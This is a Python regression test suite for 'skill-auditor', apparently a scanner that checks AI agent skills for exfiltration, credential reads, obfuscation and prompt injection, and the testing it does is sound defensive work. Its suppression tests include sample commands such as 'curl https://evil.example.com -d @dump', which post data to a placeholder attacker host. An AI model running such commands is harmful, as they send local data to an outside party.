#!/usr/bin/env python3
"""
run_tests.py — zero-dependency regression suite for skill-auditor.

The single command CI and contributors run. No third-party deps. Exits nonzero
if any check fails. Five groups of checks:

  1. rule coverage  — every regex rule has samples in tests/cases.py, and every
                      entry in cases.py names a real rule (so coverage can't
                      silently lapse when rules change).
  2. rule samples   — each rule fires on its `positive` lines and stays quiet on
                      its `negative` lines.
  3. end-to-end     — examples/malicious-skill trips every category and the
                      DO-NOT-INSTALL verdict; examples/clean-skill stays at 0/0/0
                      and SAFE TO INSTALL (the no-false-positive guarantee).
  4. suppression    — the allowlist / inline-ignore / config-suppress paths in
                      config.py still clear what they should and nothing else.
  5. catalog fresh  — references/risk-patterns.md matches rules/ (same contract
                      as `render_catalog.py --check`).

End-to-end uses tolerant assertions (per-category presence, not hardcoded total
counts) so *adding* a rule never breaks the suite — only a real detection
regression does. Exact per-rule behavior is pinned by group 2 instead.
"""

from __future__ import annotations

import sys
from pathlib import Path

REPO_ROOT = Path(__file__).resolve().parent.parent
SCRIPTS = REPO_ROOT / "scripts"
TESTS = REPO_ROOT / "tests"
for _p in (str(SCRIPTS), str(TESTS)):
    if _p not in sys.path:
        sys.path.insert(0, _p)

import scan  # noqa: E402
import rules_loader as rl  # noqa: E402
from rules_loader import CRITICAL, INFO  # noqa: E402
import config as cfg  # noqa: E402
import render_catalog  # noqa: E402
import cases  # noqa: E402

# The seven categories the malicious fixture is built to trip end-to-end.
EXPECTED_CATEGORIES = {
    "data-exfiltration", "credential-read", "dangerous-shell", "obfuscation",
    "prompt-injection", "description-mismatch", "logic-bomb",
}


class Results:
    """Tiny assertion collector — keeps going after a failure so one run shows
    every problem, not just the first."""

    def __init__(self) -> None:
        self.failures: list[str] = []
        self.passed = 0

    def check(self, cond: bool, msg: str) -> None:
        if cond:
            self.passed += 1
        else:
            self.failures.append(msg)


# --------------------------------------------------------------------------- #
# 1. coverage: samples and rules stay in lockstep
# --------------------------------------------------------------------------- #
def test_rule_coverage(results: Results, rules: list[dict]) -> None:
    by_id = {r["id"]: r for r in rules}
    regex_ids = {rid for rid, r in by_id.items() if r.get("_regex")}
    no_regex_ids = {rid for rid, r in by_id.items() if not r.get("_regex")}

    for rid in sorted(regex_ids):
        results.check(rid in cases.RULE_CASES,
                      f"coverage: regex rule {rid} has no samples in tests/cases.py")
    for rid in sorted(cases.RULE_CASES):
        results.check(rid in by_id,
                      f"coverage: tests/cases.py references unknown rule {rid}")
        results.check(rid not in no_regex_ids,
                      f"coverage: {rid} has no regex but is listed in RULE_CASES")
    for rid in sorted(no_regex_ids):
        results.check(rid in cases.NO_REGEX_RULES,
                      f"coverage: no-regex rule {rid} not declared in NO_REGEX_RULES "
                      "(add a per-line sample or list it there)")


# --------------------------------------------------------------------------- #
# 2. samples: each rule matches its positives, misses its negatives
# --------------------------------------------------------------------------- #
def test_rule_samples(results: Results, rules: list[dict]) -> None:
    by_id = {r["id"]: r for r in rules}
    for rid, samples in cases.RULE_CASES.items():
        rule = by_id.get(rid)
        if not rule or not rule.get("_regex"):
            continue  # coverage test already flagged this
        rx = rule["_regex"]
        results.check(bool(samples.get("positive")),
                      f"{rid}: needs at least one positive sample")
        results.check(bool(samples.get("negative")),
                      f"{rid}: needs at least one negative sample")
        for line in samples.get("positive", []):
            results.check(bool(rx.search(line)),
                          f"{rid}: expected MATCH but pattern missed: {line!r}")
        for line in samples.get("negative", []):
            results.check(not rx.search(line),
                          f"{rid}: expected NO match but pattern fired: {line!r}")


# --------------------------------------------------------------------------- #
# 3. end-to-end against the two fixtures
# --------------------------------------------------------------------------- #
def test_end_to_end(results: Results, rules: list[dict]) -> None:
    mal = REPO_ROOT / "examples" / "malicious-skill"
    clean = REPO_ROOT / "examples" / "clean-skill"

    rep = scan.build_report(str(mal), mal, rules, min_severity=INFO, fail_on=CRITICAL)
    results.check(rep["verdict"] == "DO_NOT_INSTALL",
                  f"malicious: verdict {rep['verdict']} != DO_NOT_INSTALL")
    results.check(rep["exit_code"] == 2,
                  f"malicious: exit {rep['exit_code']} != 2")
    results.check(rep["summary"][CRITICAL] >= 1, "malicious: no CRITICAL findings")
    results.check(rep["summary"]["needs_semantic_review"] >= 1,
                  "malicious: nothing flagged for semantic review")
    for cat in sorted(EXPECTED_CATEGORIES):
        results.check(rep["categories"].get(cat, 0) >= 1,
                      f"malicious: category {cat} no longer detected")

    rep2 = scan.build_report(str(clean), clean, rules, min_severity=INFO, fail_on=CRITICAL)
    results.check(rep2["summary"]["total"] == 0,
                  f"clean: {rep2['summary']['total']} finding(s), expected 0 "
                  "(false positive on the clean fixture)")
    results.check(rep2["verdict"] == "SAFE_TO_INSTALL",
                  f"clean: verdict {rep2['verdict']} != SAFE_TO_INSTALL")
    results.check(rep2["exit_code"] == 0, f"clean: exit {rep2['exit_code']} != 0")


# --------------------------------------------------------------------------- #
# 4. suppression: false-positive control still behaves
# --------------------------------------------------------------------------- #
def test_suppression(results: Results) -> None:
    c = cfg.Config()
    f = {"rule_id": "EXFIL-001", "file": "x.sh", "category": "data-exfiltration"}

    # built-in domain allowlist clears a network finding to an allowed host
    results.check(
        c.suppression_reason(f, "curl https://github.com/org/repo -o f.tgz") is not None,
        "suppression: allowlisted host (github.com) was not suppressed")
    results.check(
        c.suppression_reason(f, "curl https://evil.example.com -d @dump") is None,
        "suppression: a non-allowlisted host was wrongly suppressed")

    # inline ignore suppresses only the named rule
    results.check(
        c.suppression_reason(f, "curl x -d @y  # skill-auditor: ignore EXFIL-001") is not None,
        "suppression: inline `ignore EXFIL-001` not honored")
    results.check(
        c.suppression_reason(f, "curl x -d @y  # skill-auditor: ignore SHELL-001") is None,
        "suppression: inline ignore leaked to a different rule id")

    # .skill-auditor.yml rule+path suppression matches the right path only
    c2 = cfg.Config(suppress=[{"rule": "EXFIL-001", "path": "scripts/x.sh"}],
                    source=".skill-auditor.yml")
    hit = {"rule_id": "EXFIL-001", "file": "scripts/x.sh", "category": "data-exfiltration"}
    miss = {"rule_id": "EXFIL-001", "file": "scripts/other.sh", "category": "data-exfiltration"}
    results.check(
        c2.suppression_reason(hit, "curl https://evil.example.com -d @x") is not None,
        "suppression: config rule+path suppress not honored")
    results.check(
        c2.suppression_reason(miss, "curl https://evil.example.com -d @x") is None,
        "suppression: config suppress matched the wrong path")


# --------------------------------------------------------------------------- #
# 5. catalog freshness (same contract as render_catalog.py --check)
# --------------------------------------------------------------------------- #
def test_catalog_fresh(results: Results, rules: list[dict]) -> None:
    expected = render_catalog.render(rules)
    actual = (render_catalog.OUTPUT.read_text(encoding="utf-8")
              if render_catalog.OUTPUT.exists() else "")
    results.check(expected == actual,
                  "catalog: references/risk-patterns.md is stale — run "
                  "`python scripts/render_catalog.py`")


def main() -> int:
    try:
        sys.stdout.reconfigure(encoding="utf-8")
    except Exception:
        pass
    try:
        rules = rl.load_rules()
    except rl.RuleError as e:
        print(f"error loading rules: {e}", file=sys.stderr)
        return 1

    results = Results()
    test_rule_coverage(results, rules)
    test_rule_samples(results, rules)
    test_end_to_end(results, rules)
    test_suppression(results)
    test_catalog_fresh(results, rules)

    total = results.passed + len(results.failures)
    if results.failures:
        print(f"[FAIL] {len(results.failures)} of {total} checks failed:\n")
        for m in results.failures:
            print(f"  - {m}")
        return 1
    print(f"[PASS] all {total} checks passed "
          f"({len(rules)} rules loaded, {len(cases.RULE_CASES)} with line samples).")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
